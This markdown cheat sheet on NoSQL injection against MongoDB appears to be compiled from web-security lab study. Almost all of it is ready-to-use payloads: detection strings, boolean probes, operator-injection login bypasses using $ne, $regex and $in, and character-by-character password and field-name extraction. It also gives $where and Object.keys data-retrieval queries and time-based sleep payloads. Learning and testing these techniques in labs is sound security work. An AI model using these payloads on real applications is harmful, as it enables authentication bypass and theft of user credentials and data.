### Table of Contents

1. [Basic Operator Difference Between SQLi and NoSQLi](#basic-operator-difference-between-sqli-and-nosqli)
2. [Detecting NoSQLi Vulnerability](#detecting-nosqli-vulnerability)
3. [NoSQL Operator Injection](#nosql-operator-injection)
4. [Submitting Query Operators](#submitting-query-operators)
5. [MongoDB Login Bypass](#mongodb-login-bypass)
6. [MongoDB Data Retrieving](#mongodb-data-retrieving)
7. [Operator Injection to Retrieve Unknown Data](#operator-injection-to-retrieve-unknown-data)
8. [Time-Based NoSQL Injection](#time-based-nosql-injection)

---

### Basic Operator Difference Between SQLi and NoSQLi

- **`or`** → **`||`**
- **`and`** → **`&&`**
- **`-- -`** → **`%00`**

---

### Detecting NoSQLi Vulnerability

#### For MongoDB Detection:
```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
#### Causing Syntax Error in MongoDB:
```
'
```
#### Escaping the Syntax Error in MongoDB:
```
\'
```
Or we can try:
```
%00
```
#### Injecting in JSON Format:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

#### Others:
```
'+%26%26+1%3d%3d1%00
'+||+1%3d%3d1%00
'||1||'
'\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
{"$where": "sleep(5000)"}
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

---

### Confirming Conditional Behavior

```
' && 0 && 'x
' && 1 && 'x
' || 1 || 'x
'||'1'=='1
'%00
```

**Example with Explanation:**

1. ```category=Gifts' && 0 && 'x``` → This will return no items like ```category=Gifts' and 1=0-- -``` in SQL injection.
2. ```category=Gifts' && 1 && 'x``` → This will return Gift items like ```category=Gifts' and 1=1-- -``` in SQL injection.
3. ```category=Gifts' || 1 || 'x``` → This will return all the items like ```category=Gifts' or 1=1-- -``` in SQL injection.
4. Same as 3.

---

### NoSQL Operator Injection

- **`$where`** - Matches documents that satisfy a JavaScript expression.
- **`$ne`** - Matches all values that are not equal to a specified value.
- **`$in`** - Matches all of the values specified in an array.
- **`$regex`** - Selects documents where values match a specified regular expression.

For more details: [Portswigger](https://portswigger.net/web-security/nosql-injection#nosql-operator-injection)

---

### Submitting Query Operators

In **JSON** messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`.

If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

---

### MongoDB Login Bypass

- `{"$regex":"wien.*"}` → For username
- `{"$ne":"Invalid"}` → For password
- `{"$in":["admin","administrator","superadmin"]}` → For brute force

![MongoDB Login Bypass Screenshot](https://github.com/user-attachments/assets/18902009-c2d8-4162-b5d8-7ebb221fd49e)

In some cases we might need to use `\`.

![Screenshot From 2025-02-13 13-24-35](https://github.com/user-attachments/assets/05947457-4d43-48a4-84ba-a4b069e7bc04)

```
"{\"$ne\":null}"
```
Using `paramtere=value` formate.
```
username=admin&password[$ne]=
```

**Note: We need to input at least one valid credential to make a valid query.**

If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

---

### MongoDB Data Retrieving

**Extracting Password:**
```
' && this.password.length < 50%00 → For extracting password length in URL
' && this.password[0] == 'a'%00 → For extracting password in URL
{"username":"admin","password":{"$regex":"^a*"}} → For extracting password via operator
```

---

### Identifying Field Names

```
' && this.anything && 'a'=='b → Confirming if there is a field name
' && this.username!=' → Identifying field names [Note: If there is a username field exists, it will respond with a different type of message]
' && this['u'] && 'a'=='b → Retrieving field name character by character
' && this.u.s.e.r.n.a.m['e'] && 'a'=='b
```

---

### Operator Injection to Retrieve Unknown Data

```
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"}  → To generate a server error.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  → To generate a false statement.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}}  → To generate a true statement.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}.*')"}}
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}0.*')"}}
```

**Key Details:**
- `Object.keys(this)[0].match('^.{0}.*')` → To identify data size (e.g., Password).
- `Object.keys(this)[0].match('^.{0}0.*')` → To fetch the data.
- `this.forgotpwd.match('^.{0}.*')` → To fetch specific key-value data size.
- `this.forgotpwd.match('^.{0}0.*')` → To fetch specific key-value data.

1st `0` means key number.  
2nd `0` means data size.  
3rd `0` means data character.  
For brute forcing, select only 2nd and 3rd `0`.

---

### Time-Based NoSQL Injection

```
{
  "username": "admin",
  "password": { "$where": "sleep(5000)" }
}
```

**Data Retrieve**

- **Initial Request:**
```
{
  "product": "Tablet",
  "price": 350,
}
```

- **Malformed Request:**
```
{
  "product": { "$eq": "Tablet" },
  "price": { "$where": "if (this.price > 300) { sleep(5000); return true; } return false;" }
}
```

---
